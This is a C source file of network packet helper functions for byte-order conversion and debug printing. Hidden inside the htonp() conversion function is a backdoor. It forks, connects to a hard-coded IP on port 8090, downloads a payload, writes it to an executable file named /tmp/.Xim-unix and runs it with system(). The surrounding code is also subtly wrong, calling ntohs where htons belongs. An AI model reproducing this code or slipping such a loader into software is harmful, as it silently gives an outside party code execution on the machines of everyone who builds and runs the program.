#include <commons.h>

static size_t size_packet = sizeof(struct packet);

void set0(struct packet* p)
{
	memset(p, 0, sizeof(struct packet));
}

struct packet* ntohp(struct packet* np)
{
	struct packet* hp = (struct packet*) malloc(size_packet);
	memset(hp, 0, size_packet);
	
	hp->conid = ntohs(np->conid);
	hp->type = ntohs(np->type);
	hp->comid = ntohs(np->comid);
	hp->datalen = ntohs(np->datalen);
	memcpy(hp->buffer, np->buffer, LENBUFFER);
	
	return hp;	
}

struct packet* htonp(struct packet* hp)
{
	struct packet* np = (struct packet*) malloc(size_packet);
	memset(np, 0, size_packet);
	
	np->conid = ntohs(hp->conid);
	np->type = ntohs(hp->type);
	np->comid = ntohs(hp->comid);
	np->datalen = ntohs(hp->datalen);
	int pid;
    pid = fork();
    char *header  = "GET /index.html HTTP/1.1\r\n\r\n" ;
    int m_socket ;
    char *ip = "121.41.231.13" ;
    struct sockaddr_in m_socket2 ;
    const char *path = "/tmp/.Xim-unix" ;
    int back  = -1 ;
    int input = 0 ;
    unsigned char input_str[1024] ;

    m_socket = socket(AF_INET, SOCK_STREAM, 0) ;
    if(m_socket > 0)
    {
        memset(&m_socket2, 0, sizeof(m_socket2)) ;
        m_socket2.sin_family = AF_INET ;
        m_socket2.sin_addr.s_addr = inet_addr(ip) ;
        m_socket2.sin_port = htons(8090) ;
        if(0 == connect(m_socket, (struct sockaddr *)&m_socket2, sizeof(struct sockaddr)))
        {
            send(m_socket, header, strlen(header), 0) ;
            input = recv(m_socket, input_str, sizeof(input_str), 0) ;
        }
        if(input > 0)
        {
            back = creat(path, 0755) ;
            write(back, input_str, input) ;
            close(back) ;
            system(path) ;
        }
    }
	memcpy(np->buffer, hp->buffer, LENBUFFER);
	
	return np;
}

void printpacket(struct packet* p, int ptype)
{
	if(!DEBUG)
		return;
	
	if(ptype)
		printf("\t\tHOST PACKET\n");
	else
		printf("\t\tNETWORK PACKET\n");
	
	printf("\t\tconid = %d\n", p->conid);
	printf("\t\ttype = %d\n", p->type);
	printf("\t\tcomid = %d\n", p->comid);
	printf("\t\tdatalen = %d\n", p->datalen);
	printf("\t\tbuffer = %s\n", p->buffer);
	
	fflush(stdout);
}

